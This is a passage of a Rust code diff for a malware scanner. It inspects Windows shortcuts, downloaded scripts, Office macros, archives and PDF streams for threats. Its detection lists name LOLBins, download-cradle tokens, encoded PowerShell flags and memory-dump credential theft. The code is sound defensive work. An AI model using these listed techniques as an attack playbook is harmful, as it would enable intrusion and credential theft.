+        arguments,
+        icon_location,
+    })
+}
+
+/// True when `lower_text` (a command line, or `target + args`) actually invokes a PowerShell host binary
+/// (`powershell`, `powershell.exe`, `pwsh`, `pwsh.exe`, `powershell_ise.exe` as a path basename token).
+pub fn invokes_powershell_host(lower_text: &str) -> bool {
+    lower_text
+        .split(|c: char| c.is_ascii_whitespace() || c == '"' || c == '\'' || c == ';' || c == ',')
+        .any(|tok| {
+            let base = tok.rsplit(['\\', '/']).next().unwrap_or(tok);
+            matches!(
+                base,
+                "powershell" | "powershell.exe" | "pwsh" | "pwsh.exe" | "powershell_ise.exe"
+            )
+        })
+}
+
+/// Detect PowerShell `-EncodedCommand` / `-ec` and prefix-shortened variants
+/// (`-e`, `-en`, `-enc`, `-enco`, …, `-encodedcommand`, `-enc:payload`) without matching `-Encoding`.
+///
+/// Callers MUST first confirm a PowerShell host is being invoked (see [`invokes_powershell_host`]), because
+/// `-e` is a common switch for unrelated tools. The `/` switch form is only honoured for `/ec` and `/enc…`
+/// (length ≥ 3) so that `cmd /E:ON` or `xcopy /E` are never treated as encoded commands.
+pub fn has_encoded_powershell_flag(lower_args: &str) -> bool {
+    lower_args
+        .split(|c: char| c.is_ascii_whitespace() || c == '"' || c == '\'' || c == ';')
+        .any(|tok| {
+            let (rest, dash) = if let Some(r) = tok.strip_prefix('-') {
+                (r, true)
+            } else if let Some(r) = tok.strip_prefix('/') {
+                (r, false)
+            } else {
+                return false;
+            };
+            let flag = rest.split([':', '=']).next().unwrap_or("");
+            if flag.is_empty() {
+                return false;
+            }
+            let is_prefix = flag == "ec" || "encodedcommand".starts_with(flag);
+            is_prefix && (dash || flag == "ec" || flag.len() >= 3)
+        })
+}
+
+/// Convenience: PowerShell host is invoked AND an encoded-command flag is present.
+pub fn is_powershell_encoded_invocation(lower_text: &str) -> bool {
+    invokes_powershell_host(lower_text) && has_encoded_powershell_flag(lower_text)
+}
+
+/// Inspect structured MS-SHLLINK (`.lnk`) target path, CLI arguments, and icon masquerading fields
+/// to detect LOLBin cradles, obfuscated script execution, or remote UNC droppers without broad string grepping.
+pub fn inspect_lnk_shortcut(
+    virtual_path: &str,
+    buffer: &[u8],
+    sha256_hex: &str,
+    entropy: f64,
+) -> Option<ThreatDetection> {
+    let parsed = parse_lnk_binary(buffer)?;
+    let target = parsed.target_path.to_ascii_lowercase();
+    let args = parsed.arguments.to_ascii_lowercase();
+    let icon = parsed.icon_location.to_ascii_lowercase();
+
+    let is_shell_or_lolbin = [
+        "powershell",
+        "pwsh",
+        "cmd.exe",
+        "mshta",
+        "rundll32",
+        "regsvr32",
+        "wscript",
+        "cscript",
+        "certutil",
+        "bitsadmin",
+    ]
+    .iter()
+    .any(|bin| target.contains(bin) || args.contains(bin));
+
+    let has_direct_weaponized_args =
+        is_powershell_encoded_invocation(&format!("{} {}", target, args))
+        || [
+            "-w hidden",
+            "-windowstyle hidden",
+            "frombase64string",
+            "downloadstring",
+            "downloadfile",
+            "invoke-expression",
+            "iex(",
+            "iex ",
+            "javascript:",
+            "vbscript:",
+            "-urlcache",
+            "/transfer",
+            "comsvcs",
+            "minidump",
+        ]
+        .iter()
+        .any(|tok| args.contains(tok));
+
+    let has_url_or_unc_arg = ["http://", "https://", "\\\\"]
+        .iter()
+        .any(|tok| args.contains(tok));
+    let has_download_or_script_cradle = [
+        "mshta",
+        "certutil",
+        "bitsadmin",
+        "regsvr32",
+        "rundll32",
+        "wscript",
+        "cscript",
+        "curl",
+        "wget",
+        "invoke-webrequest",
+        "iwr ",
+        "irm ",
+        "invoke-restmethod",
+        "webclient",
+        "xmlhttp",
+        "start-bitstransfer",
+    ]
+    .iter()
+    .any(|tok| target.contains(tok) || args.contains(tok));
+
+    let has_weaponized_args =
+        has_direct_weaponized_args || (has_url_or_unc_arg && has_download_or_script_cradle);
+
+    let has_doc_icon_masquerade = [".pdf", ".doc", ".xls", "acrord", "wordicon", "pdficon"]
+        .iter()
+        .any(|tok| icon.contains(tok));
+
+    let remote_unc_exec = target.starts_with("\\\\")
+        && [".exe", ".dll", ".scr", ".bat", ".vbs", ".ps1", ".hta"]
+            .iter()
+            .any(|ext| target.contains(ext));
+
+    if (is_shell_or_lolbin && (has_weaponized_args || has_doc_icon_masquerade)) || remote_unc_exec {
+        return Some(detection(
+            virtual_path,
+            sha256_hex,
+            entropy,
+            "Heur.LNK.MaliciousShortcutDropper",
+            "Trojan.Shortcut",
+            "High",
+            "LNK Shortcut Structure Inspector",
+            "Windows Shortcut (.lnk) target/arguments execute a weaponized LOLBin cradle, document-icon masquerade, or remote UNC payload.".to_string(),
+        ));
+    }
+
+    None
+}
+
+/// Evaluate Mark-of-the-Web (Internet `ZoneId=3/4`) script droppers and high-entropy executables.
+pub fn evaluate_motw_payload_risk(
+    full_path: &str,
+    file_name: &str,
+    buffer: &[u8],
+    sha256_hex: &str,
+    entropy: f64,
+) -> Option<ThreatDetection> {
+    let ext = Path::new(file_name)
+        .extension()
+        .map(|e| e.to_string_lossy().to_ascii_lowercase())
+        .unwrap_or_default();
+
+    let is_script_or_dropper = matches!(
+        ext.as_str(),
+        "hta" | "vbs" | "vbe" | "js" | "jse" | "wsf" | "ps1" | "bat" | "cmd"
+    );
+    if is_script_or_dropper {
+        let mut combined = String::from_utf8_lossy(buffer).to_ascii_lowercase();
+        if let Some(u16_text) = extract_utf16le_ascii(buffer) {
+            combined.push('\n');
+            combined.push_str(&u16_text.to_ascii_lowercase());
+        }
+        let has_dropper_primitive = is_powershell_encoded_invocation(&combined)
+            || [
+            "wscript.shell",
+            "scripting.filesystemobject",
+            "adodb.stream",
+            "xmlhttp",
+            "urldownloadtofile",
+            "invoke-webrequest",
+            "downloadstring",
+            "frombase64string",
+            "-encodedcommand",
+            "rundll32",
+            "regsvr32",
+            "mshta",
+            "certutil",
+            "bitsadmin",
+        ]
+        .iter()
+        .any(|tok| combined.contains(tok));
+        if has_dropper_primitive {
+            return Some(detection(
+                full_path,
+                sha256_hex,
+                entropy,
+                "Heur.MotW.InternetScriptDropper",
+                "Trojan.Downloader",
+                "High",
+                "Mark-of-the-Web (Zone.Identifier) Guard",
+                "Internet-downloaded script/dropper (ZoneId=3/4) contains shell, COM, or network execution primitives.".to_string(),
+            ));
+        }
+    }
+
+    let is_risky_bin = matches!(ext.as_str(), "exe" | "dll" | "scr" | "msi" | "cpl" | "ocx");
+    if is_risky_bin && entropy > 6.85 {
+        return Some(detection(
+            full_path,
+            sha256_hex,
+            entropy,
+            "Heur.MotW.PackedInternetExecutable",
+            "Suspicious.MotW",
+            "High",
+            "Mark-of-the-Web (Zone.Identifier) Guard",
+            "Internet-downloaded executable (ZoneId=3/4) exhibits high packed/encrypted entropy."
+                .to_string(),
+        ));
+    }
+
+    None
+}
+
+/// Check NTFS Mark-of-the-Web (`:Zone.Identifier` Alternate Data Stream) for Internet (`ZoneId=3`)
+/// or Restricted Sites (`ZoneId=4`) download origin.
+pub fn has_internet_motw(_path: &Path) -> bool {
+    #[cfg(target_os = "windows")]
+    {
+        let ads_path = format!("{}:Zone.Identifier", _path.display());
+        if let Ok(mut file) = File::open(ads_path) {
+            let mut buf = [0u8; 4096];
+            if let Ok(n) = file.read(&mut buf) {
+                let text = String::from_utf8_lossy(&buf[..n]).to_ascii_lowercase();
+                return text.contains("zoneid=3") || text.contains("zoneid=4");
+            }
+        }
+    }
+    false
+}
+
+/// Inspect OLE2 / `vbaProject.bin` payloads for weaponized Office VBA macro execution patterns.
+fn detect_office_macro_threat(
+    virtual_path: &str,
+    sha256_hex: &str,
+    entropy: f64,
+    payload: &[u8],
+) -> Option<ThreatDetection> {
+    let mut searchable = String::from_utf8_lossy(payload).to_lowercase();
+    if let Some(u16_text) = extract_utf16le_ascii(payload) {
+        searchable.push('\n');
+        searchable.push_str(&u16_text.to_lowercase());
+    }
+    let has_trigger = ["autoopen", "auto_open", "autoexec", "document_open", "workbook_open"]
+        .iter()
+        .any(|k| searchable.contains(k));
+    let has_exec = [
+        "wscript.shell",
+        "createobject",
+        "powershell",
+        "cmd.exe",
+        "urldownloadtofile",
+        "msxml2.xmlhttp",
+        "shell(",
+        "/c ",
+    ]
+    .iter()
+    .any(|k| searchable.contains(k));
+    if has_trigger && has_exec {
+        return Some(detection(
+            virtual_path,
+            sha256_hex,
+            entropy,
+            "Heur.Office.MaliciousVBAMacro",
+            "Trojan.OfficeMacro",
+            "Critical",
+            "Deep Office Macro Inspector",
+            "Weaponized Office VBA macro combining auto-execution trigger with shell/network dropper payload.".to_string(),
+        ));
+    }
+    None
+}
+
+struct ZipMemberMeta<'a> {
+    name: String,
+    flags: u16,
+    method: u16,
+    comp_data: &'a [u8],
+    uncomp_size: u32,
+}
+
+fn collect_zip_members(buffer: &[u8]) -> Vec<ZipMemberMeta<'_>> {
+    let mut entries = Vec::new();
+
+    // Prefer Central Directory when EOCD + CD fit inside our inspected buffer (handles data descriptors).
+    let search_start = buffer.len().saturating_sub(65_558);
+    if let Some(rel_eocd) = buffer[search_start..]
+        .windows(4)
+        .rposition(|w| w == b"PK\x05\x06")
+    {
+        let eocd_off = search_start + rel_eocd;
+        if let (Some(cd_size), Some(cd_off)) = (le_u32(buffer, eocd_off + 12), le_u32(buffer, eocd_off + 16)) {
+            let cd_off = cd_off as usize;
+            let cd_end = cd_off.saturating_add(cd_size as usize);
+            if cd_end <= buffer.len() {
+                let mut cur = cd_off;
+                while cur + 46 <= cd_end && entries.len() < MAX_ARCHIVE_ENTRIES {
+                    if &buffer[cur..cur + 4] != b"PK\x01\x02" {
+                        break;
+                    }
+                    let flags = le_u16(buffer, cur + 8).unwrap_or(0);
+                    let method = le_u16(buffer, cur + 10).unwrap_or(0);
+                    let comp_size = le_u32(buffer, cur + 20).unwrap_or(0);
+                    let uncomp_size = le_u32(buffer, cur + 24).unwrap_or(0);
+                    let fname_len = le_u16(buffer, cur + 28).unwrap_or(0) as usize;
+                    let extra_len = le_u16(buffer, cur + 30).unwrap_or(0) as usize;
+                    let comment_len = le_u16(buffer, cur + 32).unwrap_or(0) as usize;
+                    let local_off = le_u32(buffer, cur + 42).unwrap_or(0) as usize;
+                    let name_end = cur + 46 + fname_len;
+                    if name_end > cd_end {
+                        break;
+                    }
+                    let name = String::from_utf8_lossy(&buffer[cur + 46..name_end]).to_string();
+                    let next_cd = name_end + extra_len + comment_len;
+                    cur = next_cd;
+
+                    let comp_data = if local_off + 30 <= buffer.len()
+                        && &buffer[local_off..local_off + 4] == b"PK\x03\x04"
+                    {
+                        let l_fn = le_u16(buffer, local_off + 26).unwrap_or(0) as usize;
+                        let l_ex = le_u16(buffer, local_off + 28).unwrap_or(0) as usize;
+                        let data_start = local_off + 30 + l_fn + l_ex;
+                        let data_end = data_start.saturating_add(comp_size as usize);
+                        if data_end <= buffer.len() && data_start <= data_end {
+                            &buffer[data_start..data_end]
+                        } else {
+                            &[][..]
+                        }
+                    } else {
+                        &[][..]
+                    };
+
+                    entries.push(ZipMemberMeta {
+                        name,
+                        flags,
+                        method,
+                        comp_data,
+                        uncomp_size,
+                    });
+                }
+                if !entries.is_empty() {
+                    return entries;
+                }
+            }
+        }
+    }
+
+    // Fallback: sequential local file header scan.
+    let mut off = 0usize;
+    while off + 30 <= buffer.len() && entries.len() < MAX_ARCHIVE_ENTRIES {
+        if &buffer[off..off + 4] != b"PK\x03\x04" {
+            break;
+        }
+        let flags = le_u16(buffer, off + 6).unwrap_or(0);
+        let method = le_u16(buffer, off + 8).unwrap_or(0);
+        let comp_size = le_u32(buffer, off + 18).unwrap_or(0) as usize;
+        let uncomp_size = le_u32(buffer, off + 22).unwrap_or(0);
+        let fname_len = le_u16(buffer, off + 26).unwrap_or(0) as usize;
+        let extra_len = le_u16(buffer, off + 28).unwrap_or(0) as usize;
+        let name_start = off + 30;
+        let data_start = name_start.saturating_add(fname_len).saturating_add(extra_len);
+        if data_start > buffer.len() {
+            break;
+        }
+        let name = String::from_utf8_lossy(&buffer[name_start..name_start + fname_len]).to_string();
+        let data_end = data_start.saturating_add(comp_size).min(buffer.len());
+        let comp_data = if comp_size > 0 && data_end > data_start {
+            &buffer[data_start..data_end]
+        } else {
+            &[][..]
+        };
+        entries.push(ZipMemberMeta {
+            name,
+            flags,
+            method,
+            comp_data,
+            uncomp_size,
+        });
+        if comp_size == 0 && (flags & 0x0008) != 0 {
+            break;
+        }
+        off = data_start.saturating_add(comp_size);
+    }
+    entries
+}
+
+fn inspect_zip_buffer(
+    virtual_path: &str,
+    buffer: &[u8],
+    outer_sha: &str,
+    outer_entropy: f64,
+    depth: u8,
+) -> Option<ThreatDetection> {
+    for member in collect_zip_members(buffer) {
+        if member.name.is_empty() {
+            continue;
+        }
+        let member_vpath = format!("{}::{}", virtual_path, member.name);
+        if is_zip_slip_path(&member.name) {
+            return Some(detection(
+                &member_vpath,
+                outer_sha,
+                outer_entropy,
+                "Heur.Archive.ZipSlipTraversal",
+                "Exploit.PathTraversal",
+                "Critical",
+                "Deep Archive Unpacker (ZIP)",
+                format!(
+                    "Archive member '{}' attempts directory traversal (ZipSlip) outside extraction target.",
+                    member.name
+                ),
+            ));
+        }
+
+        let is_encrypted = (member.flags & 0x0001) != 0;
+        if is_encrypted && is_executable_or_script_name(&member.name) {
+            return Some(detection(
+                &member_vpath,
+                outer_sha,
+                outer_entropy,
+                "Heur.Archive.EncryptedExecutableDropper",
+                "Suspicious.Archive",
+                "High",
+                "Deep Archive Unpacker (ZIP)",
+                format!(
+                    "Password-encrypted executable or script dropper '{}' inside archive evades static inspection.",
+                    member.name
+                ),
+            ));
+        }
+
+        let comp_len = member.comp_data.len();
+        if member.uncomp_size as usize > MAX_MEMBER_UNPACK_BYTES
+            || (comp_len > 0
+                && member.uncomp_size as usize > 512 * 1024
+                && (member.uncomp_size as usize) / comp_len > MAX_COMPRESSION_RATIO)
+        {
+            return Some(detection(
+                &member_vpath,
+                outer_sha,
+                outer_entropy,
+                "Heur.Archive.ZipBomb",
+                "Exploit.DoS",
+                "High",
+                "Deep Archive Unpacker (ZIP)",
+                format!(
+                    "Archive member '{}' declares excessive uncompressed ratio/size ({} bytes).",
+                    member.name, member.uncomp_size
+                ),
+            ));
+        }
+
+        if is_encrypted || member.comp_data.is_empty() || member.name.ends_with('/') {
+            continue;
+        }
+
+        let decompressed = match member.method {
+            0 => {
+                if member.comp_data.len() > MAX_MEMBER_UNPACK_BYTES {
+                    return Some(detection(
+                        &member_vpath,
+                        outer_sha,
+                        outer_entropy,
+                        "Heur.Archive.ZipBomb",
+                        "Exploit.DoS",
+                        "High",
+                        "Deep Archive Unpacker (ZIP)",
+                        "Stored archive member exceeds 8 MB safety ceiling.".to_string(),
+                    ));
+                }
+                member.comp_data.to_vec()
+            }
+            8 => match read_bounded(DeflateDecoder::new(member.comp_data), MAX_MEMBER_UNPACK_BYTES) {
+                Some((_, true)) => {
+                    return Some(detection(
+                        &member_vpath,
+                        outer_sha,
+                        outer_entropy,
+                        "Heur.Archive.ZipBomb",
+                        "Exploit.DoS",
+                        "High",
+                        "Deep Archive Unpacker (ZIP)",
+                        format!(
+                            "Deflate stream for '{}' expanded beyond {} byte safety ceiling.",
+                            member.name, MAX_MEMBER_UNPACK_BYTES
+                        ),
+                    ));
+                }
+                Some((bytes, false)) => {
+                    if bytes.len() > 512 * 1024 && comp_len > 0 && bytes.len() / comp_len > MAX_COMPRESSION_RATIO
+                    {
+                        return Some(detection(
+                            &member_vpath,
+                            outer_sha,
+                            outer_entropy,
+                            "Heur.Archive.ZipBomb",
+                            "Exploit.DoS",
+                            "High",
+                            "Deep Archive Unpacker (ZIP)",
+                            format!(
+                                "High-ratio ZipBomb expansion ({}:1) in '{}'.",
+                                bytes.len() / comp_len,
+                                member.name
+                            ),
+                        ));
+                    }
+                    bytes
+                }
+                None => continue,
+            },
+            _ => continue,
+        };
+
+        if decompressed.is_empty() {
+            continue;
+        }
+
+        let member_sha = hex::encode(Sha256::digest(&decompressed));
+        let lower_member = member.name.to_ascii_lowercase();
+        if lower_member.ends_with("vbaproject.bin") {
+            if let Some(det) = detect_office_macro_threat(
+                &member_vpath,
+                &member_sha,
+                calculate_entropy(&decompressed),
+                &decompressed,
+            ) {
+                return Some(det);
+            }
+        }
+
+        let base_name = member
+            .name
+            .rsplit(|c| c == '/' || c == '\\')
+            .next()
+            .unwrap_or(&member.name)
+            .to_string();
+        if let Some(det) = scan_buffer_layers(
+            &member_vpath,
+            &base_name,
+            &decompressed,
+            &member_sha,
+            depth + 1,
+            false,
+        ) {
+            return Some(det);
+        }
+    }
+    None
+}
+
+fn inspect_gzip_buffer(
+    virtual_path: &str,
+    file_name: &str,
+    buffer: &[u8],
+    outer_sha: &str,
+    outer_entropy: f64,
+    depth: u8,
+) -> Option<ThreatDetection> {
+    let gz_vpath = format!("{}::gunzip", virtual_path);
+    match read_bounded(GzDecoder::new(buffer), MAX_MEMBER_UNPACK_BYTES) {
+        Some((_, true)) => Some(detection(
+            &gz_vpath,
+            outer_sha,
+            outer_entropy,
+            "Heur.Archive.ZipBomb",
+            "Exploit.DoS",
+            "High",
+            "Deep Archive Unpacker (GZIP)",
+            "GZIP stream exceeds 8 MB safety unpacking ceiling (potential decompression bomb).".to_string(),
+        )),
+        Some((decompressed, false)) => {
+            if decompressed.len() > 512 * 1024
+                && !buffer.is_empty()
+                && decompressed.len() / buffer.len() > MAX_COMPRESSION_RATIO
+            {
+                return Some(detection(
+                    &gz_vpath,
+                    outer_sha,
+                    outer_entropy,
+                    "Heur.Archive.ZipBomb",
+                    "Exploit.DoS",
+                    "High",
+                    "Deep Archive Unpacker (GZIP)",
+                    "GZIP stream exceeded 100:1 expansion ratio.".to_string(),
+                ));
+            }
+            if decompressed.is_empty() {
+                return None;
+            }
+            let inner_name = if file_name.to_ascii_lowercase().ends_with(".tgz") {
+                format!("{}.tar", &file_name[..file_name.len() - 4])
+            } else if file_name.to_ascii_lowercase().ends_with(".gz") {
+                file_name[..file_name.len() - 3].to_string()
+            } else {
+                "gunzip_payload.bin".to_string()
+            };
+            let inner_sha = hex::encode(Sha256::digest(&decompressed));
+            scan_buffer_layers(&gz_vpath, &inner_name, &decompressed, &inner_sha, depth + 1, false)
+        }
+        None => None,
+    }
+}
+
+fn inspect_tar_buffer(
+    virtual_path: &str,
+    buffer: &[u8],
+    outer_sha: &str,
+    outer_entropy: f64,
+    depth: u8,
+) -> Option<ThreatDetection> {
+    let mut off = 0usize;
+    let mut count = 0usize;
+    while off + 512 <= buffer.len() && count < MAX_ARCHIVE_ENTRIES {
+        let hdr = &buffer[off..off + 512];
+        if hdr.iter().all(|&b| b == 0) {
+            break;
+        }
+        count += 1;
+        let name_part = String::from_utf8_lossy(&hdr[0..100])
+            .trim_end_matches('\0')
+            .to_string();
+        let prefix_part = if &hdr[257..262] == b"ustar" {
+            String::from_utf8_lossy(&hdr[345..500])
+                .trim_end_matches('\0')
+                .to_string()
+        } else {
+            String::new()
+        };
+        let member_name = if prefix_part.is_empty() {
+            name_part
+        } else {
+            format!("{}/{}", prefix_part, name_part)
+        };
+        let size_str = String::from_utf8_lossy(&hdr[124..136])
+            .trim_matches(|c: char| c == '\0' || c.is_whitespace())
+            .to_string();
+        let size = usize::from_str_radix(&size_str, 8).unwrap_or(0);
+        let typeflag = hdr[156];
+
+        if !member_name.is_empty() && is_zip_slip_path(&member_name) {
+            return Some(detection(
+                &format!("{}::{}", virtual_path, member_name),
+                outer_sha,
+                outer_entropy,
+                "Heur.Archive.ZipSlipTraversal",
+                "Exploit.PathTraversal",
+                "Critical",
+                "Deep Archive Unpacker (TAR)",
+                format!(
+                    "TAR member '{}' attempts path traversal outside extraction directory.",
+                    member_name
+                ),
+            ));
+        }
+
+        let data_start = off + 512;
+        let data_end = data_start.saturating_add(size).min(buffer.len());
+        let is_regular = matches!(typeflag, b'0' | b'\0' | b'7');
+        if is_regular && size > 0 && size <= MAX_MEMBER_UNPACK_BYTES && data_start < data_end {
+            let payload = &buffer[data_start..data_end];
+            let member_vpath = format!("{}::{}", virtual_path, member_name);
+            let member_sha = hex::encode(Sha256::digest(payload));
+            let base_name = member_name
+                .rsplit('/')
+                .next()
+                .unwrap_or(&member_name)
+                .to_string();
+            if let Some(det) = scan_buffer_layers(
+                &member_vpath,
+                &base_name,
+                payload,
+                &member_sha,
+                depth + 1,
+                false,
+            ) {
+                return Some(det);
+            }
+        }
+
+        let blocks = size.div_ceil(512);
+        let step = 512usize.saturating_add(blocks.saturating_mul(512));
+        off = match off.checked_add(step) {
+            Some(next) if next > off => next,
+            _ => break,
+        };
+    }
+    None
+}
+
+fn inspect_pdf_buffer(
+    virtual_path: &str,
+    buffer: &[u8],
+    outer_sha: &str,
+    outer_entropy: f64,
+    depth: u8,
+) -> Option<ThreatDetection> {
+    let mut combined_lower = String::from_utf8_lossy(buffer).to_lowercase();
+    let mut pos = 0usize;
+    let mut stream_idx = 0usize;
+    let mut total_decoded = 0usize;
+
+    while pos + 6 < buffer.len()
+        && stream_idx < MAX_ARCHIVE_ENTRIES
+        && total_decoded < MAX_MEMBER_UNPACK_BYTES
+    {
+        let Some(rel) = buffer[pos..].windows(6).position(|w| w == b"stream") else {
+            break;
+        };
+        let s_off = pos + rel;
+        let after = s_off + 6;
+        let prev_ok = s_off == 0 || matches!(buffer[s_off - 1], b' ' | b'\n' | b'\r' | b'\t' | b'>');
+        let line_break_len = if buffer.get(after..after + 2) == Some(b"\r\n") {
+            2
+        } else if matches!(buffer.get(after), Some(b'\n' | b'\r')) {
+            1
+        } else {
+            pos = after;
+            continue;
+        };
+        if !prev_ok {
+            pos = after;
+            continue;
+        }
+        let body_start = after + line_break_len;
+        let Some(rel_end) = buffer[body_start..].windows(9).position(|w| w == b"endstream") else {
+            break;
+        };
+        let mut body_end = body_start + rel_end;
+        if body_end >= 2 && &buffer[body_end - 2..body_end] == b"\r\n" {
+            body_end -= 2;
+        } else if body_end >= 1 && matches!(buffer[body_end - 1], b'\n' | b'\r') {
+            body_end -= 1;
+        }
+
+        let raw_stream = &buffer[body_start..body_end];
+        stream_idx += 1;
+        pos = body_start + rel_end + 9;
+
+        let decoded_opt = if raw_stream.len() >= 2 && raw_stream[0] == 0x78 {
+            read_bounded(ZlibDecoder::new(raw_stream), 2 * 1024 * 1024).map(|(b, _)| b)
+        } else {
+            None
+        }
+        .or_else(|| {
+            read_bounded(DeflateDecoder::new(raw_stream), 2 * 1024 * 1024)
+                .map(|(b, _)| b)
+                .filter(|b| !b.is_empty())
+        });
+
+        if let Some(decoded) = decoded_opt {
+            if !decoded.is_empty() {
+                total_decoded += decoded.len();
+                combined_lower.push('\n');
+                combined_lower.push_str(&String::from_utf8_lossy(&decoded).to_lowercase());
+                let stream_vpath = format!("{}::pdf_stream_{}", virtual_path, stream_idx);
+                let stream_sha = hex::encode(Sha256::digest(&decoded));
+                if let Some(det) = scan_buffer_layers(
+                    &stream_vpath,
+                    "pdf_stream.bin",
+                    &decoded,
+                    &stream_sha,
+                    depth + 1,
+                    false,
+                ) {
+                    return Some(det);
+                }
+            }
+        }
+    }
+
+    let has_auto = combined_lower.contains("/openaction") || combined_lower.contains("/aa");
+    let has_active_payload = combined_lower.contains("/js")
+        || combined_lower.contains("/javascript")
+        || combined_lower.contains("/launch")
+        || combined_lower.contains("cmd.exe")
+        || combined_lower.contains("powershell")
+        || combined_lower.contains("/bin/sh");
+    if has_auto && has_active_payload {
+        return Some(detection(
+            virtual_path,
+            outer_sha,
+            outer_entropy,
+            "Exploit.PDF.ActiveScriptOrLaunch",
+            "Exploit.PDF",
+            "High",
+            "Deep PDF Stream Inspector",
+            "PDF embeds automatic trigger (/OpenAction or /AA) paired with /JavaScript or /Launch command execution.".to_string(),
+        ));
+    }
+    None
+}
+
+fn inspect_base64_layers(
+    virtual_path: &str,
+    content_lossy: &str,
+    depth: u8,
+) -> Option<ThreatDetection> {
+    static B64_BLOB_RE: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r"[A-Za-z0-9+/]{40,8192}={0,2}").unwrap());
+
+    for (idx, m) in B64_BLOB_RE.find_iter(content_lossy).take(16).enumerate() {
+        let candidate = m.as_str();
+        let decoded = base64::engine::general_purpose::STANDARD
+            .decode(candidate)
+            .or_else(|_| base64::engine::general_purpose::STANDARD_NO_PAD.decode(candidate.trim_end_matches('=')))
+            .ok();
+        let Some(bytes) = decoded else {
+            continue;
+        };
+        if bytes.len() < 16 {
+            continue;
+        }
+        let is_binary_stage = bytes.starts_with(b"MZ")
+            || bytes.starts_with(b"\x7fELF")
+            || bytes.starts_with(b"PK\x03\x04")
+            || bytes.starts_with(b"\x1f\x8b")
+            || bytes.starts_with(b"%PDF-");
+
+        let normalized = extract_utf16le_ascii(&bytes).map(|s| s.into_bytes());
+        let scan_bytes = normalized.as_deref().unwrap_or(&bytes);
+        let printable_count = scan_bytes
+            .iter()
+            .filter(|&&b| (0x20..=0x7e).contains(&b) || matches!(b, b'\n' | b'\r' | b'\t'))
+            .count();
+        let is_text_stage = printable_count * 4 >= scan_bytes.len() * 3;
+        if !is_binary_stage && !is_text_stage {
+            continue;
+        }
+
+        let b64_vpath = format!("{}::b64_layer_{}", virtual_path, idx + 1);
+        let b64_sha = hex::encode(Sha256::digest(scan_bytes));
+        if let Some(det) = scan_buffer_layers(
+            &b64_vpath,
+            "decoded_b64.ps1",
+            scan_bytes,
+            &b64_sha,
+            depth + 1,
+            false,
+        ) {
+            return Some(det);
+        }
+    }
+    None
+}
+
+fn check_hash_layers(
+    virtual_path: &str,
+    sha256_hex: &str,
+    entropy: f64,
+) -> Option<ThreatDetection> {
+    if let Some(&(name, category, severity)) = KNOWN_HASHES.get(sha256_hex) {
+        return Some(detection(
+            virtual_path,
+            sha256_hex,
+            entropy,
+            name,
+            category,
+            severity,
+            "Signature Engine (SHA-256)",
+            "Exact cryptographic hash match against core threat database.".to_string(),
+        ));
+    }
+    if let Some((name, category, severity)) = lookup_sqlite_hash(sha256_hex) {
+        return Some(detection(
+            virtual_path,
+            sha256_hex,
+            entropy,
+            &name,
+            &category,
+            &severity,
+            "SQLite Threat DB (O(1) SHA-256)",
+            "SHA-256 matched indexed local threat_hashes.db signature.".to_string(),
+        ));
+    }
+    if threat_intel_and_net::is_known_malware_hash(sha256_hex) {
+        return Some(detection(
+            virtual_path,
+            sha256_hex,
+            entropy,
+            "ThreatFeed.MalwareBazaar.Sample",
+            "Malware",
+            "Critical",
+            "Signature Engine (MalwareBazaar feed)",
+            "SHA-256 matches a recent malware sample published by abuse.ch MalwareBazaar.".to_string(),
+        ));
+    }
+    None
+}
+
+fn scan_yara_rules(
+    virtual_path: &str,
+    sha256_hex: &str,
+    entropy: f64,
+    content_lossy: &str,
+    raw: &[u8],
+) -> Option<ThreatDetection> {
+    if let Ok(engine) = SCANNER_ENGINE.read() {
+        for rule in &engine.yara_rules {
+            if rule.matches(content_lossy, raw) {
+                return Some(detection(
+                    virtual_path,
+                    sha256_hex,
+                    entropy,
+                    &rule.name,
+                    &rule.category,
+                    &rule.severity,
+                    "YARA-X Behavioral Engine",
+                    rule.description.clone(),
+                ));
+            }
+        }
+    }
+    None
+}
+
+/// Inspect an in-memory buffer across container unpackers, script de-obfuscation,
+/// YARA rules, PE/ELF heuristics, local `clamd`, and optional cloud reputation.
+fn scan_buffer_layers(
+    virtual_path: &str,
+    file_name: &str,
+    buffer: &[u8],
+    sha256_hex: &str,
+    depth: u8,
+    allow_cloud: bool,
+) -> Option<ThreatDetection> {
+    if buffer.is_empty() || depth > MAX_ARCHIVE_DEPTH {
+        return None;
+    }
+    if depth > 0 && quarantine::is_allowlisted(sha256_hex) {
+        return None;
+    }
+
+    let entropy = calculate_entropy(buffer);
+
+    if depth > 0 {
+        if let Some(det) = check_hash_layers(virtual_path, sha256_hex, entropy) {
+            return Some(det);
+        }
+        let eicar = eicar_test_string();
+        if buffer.starts_with(eicar.as_bytes())
+            || String::from_utf8_lossy(buffer).contains(&eicar)
+        {
+            return Some(detection(
+                virtual_path,
+                sha256_hex,
+                entropy,
+                "EICAR-Standard-AV-Test-Signature",
+                "Test.Signature",
+                "High",
+                "Signature Engine (EICAR)",
+                "Standard EICAR antivirus signature detected inside unpacked container or script layer.".to_string(),
+            ));
+        }
+        if DOUBLE_EXT_REGEX.is_match(file_name) {
+            return Some(detection(
+                virtual_path,
+                sha256_hex,
+                entropy,
+                "Heur.Masquerade.DoubleExtension",
+                "Trojan.Masquerade",
+                "High",
+                "Heuristic File Anomaly",
+                format!("Executable disguised with deceptive double file extension ({}).", file_name),
+            ));
+        }
+        if let Some(reason) = is_disguised_executable_header(Path::new(file_name), buffer) {
+            return Some(detection(
+                virtual_path,
+                sha256_hex,
+                entropy,
+                "Heur.Masquerade.DisguisedMagicHeader",
+                "Trojan.Masquerade",
+                "Critical",
+                "Magic Header Inspector (ELF/PE)",
+                format!("{} ({}).", reason, file_name),
+            ));
+        }
+    }
+
+    // Container, Archive & Document Unpacking (depth-bounded).
+    if depth < MAX_ARCHIVE_DEPTH {
+        if buffer.starts_with(b"PK\x03\x04") {
+            if let Some(det) = inspect_zip_buffer(virtual_path, buffer, sha256_hex, entropy, depth) {
+                return Some(det);
+            }
+        } else if buffer.starts_with(b"\x1f\x8b") {
+            if let Some(det) =
+                inspect_gzip_buffer(virtual_path, file_name, buffer, sha256_hex, entropy, depth)
+            {
+                return Some(det);
+            }
+        } else if is_tar_buffer(buffer) {
+            if let Some(det) = inspect_tar_buffer(virtual_path, buffer, sha256_hex, entropy, depth) {
+                return Some(det);
+            }
+        } else if buffer.starts_with(b"%PDF-") {
+            if let Some(det) = inspect_pdf_buffer(virtual_path, buffer, sha256_hex, entropy, depth) {
+                return Some(det);
+            }
